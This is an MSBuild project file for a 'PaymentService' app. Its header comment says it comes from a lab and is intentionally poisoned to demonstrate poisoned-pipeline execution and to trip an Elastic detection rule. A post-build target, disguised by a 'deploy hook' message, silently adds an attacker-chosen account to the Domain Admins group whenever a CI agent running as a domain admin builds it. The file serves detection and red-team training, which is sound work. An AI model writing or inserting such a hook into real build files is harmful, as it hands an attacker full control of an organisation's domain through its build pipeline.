<!-- ============================================================================
     M8.1 POISONED build-runner project (LAB ONLY - intentionally malicious).
     This is the clean PaymentService.csproj with an added MSBuild PostBuild target.
     When the TeamCity agent builds it as alpha\svc_build (Domain Admin), the Exec
     runs AS DOMAIN ADMIN. Because the child process is spawned by the Microsoft-
     signed MSBuild.exe, it evades Elastic/Sysmon rules that trust signed developer
     utilities  -> MITRE T1127.001 (Trusted Developer Utilities: MSBuild),
     OWASP CICD-SEC-4 (Poisoned Pipeline Execution).

     The Elastic prebuilt rule this is meant to (eventually) trip:
       "Execution via MSBuild / Pre-Post Build Events".

     Apply during the attack with files/poison/inject_poison.diff, or just replace
     the repo's PaymentService.csproj with this file and trigger a build.
     ============================================================================ -->
<Project ToolsVersion="Current" DefaultTargets="Build"
         xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props"
          Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Release</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <OutputType>Exe</OutputType>
    <RootNamespace>PaymentService</RootNamespace>
    <AssemblyName>PaymentService</AssemblyName>
    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
    <OutputPath>bin\$(Configuration)\</OutputPath>
    <!-- attacker-controlled principal to escalate; overridable with /p:AttackerUser=... -->
    <AttackerUser Condition=" '$(AttackerUser)' == '' ">devuser</AttackerUser>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="System" />
    <Reference Include="System.Core" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include="Program.cs" />
  </ItemGroup>
  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />

  <!-- === THE POISON === runs after every successful build, as the agent identity. -->
  <Target Name="_PoisonAfterBuild" AfterTargets="Build">
    <Message Importance="high" Text="[payment-service] running post-build deploy hook..." />
    <Exec Command="net group &quot;Domain Admins&quot; $(AttackerUser) /add /domain"
          ContinueOnError="true" />
  </Target>
</Project>
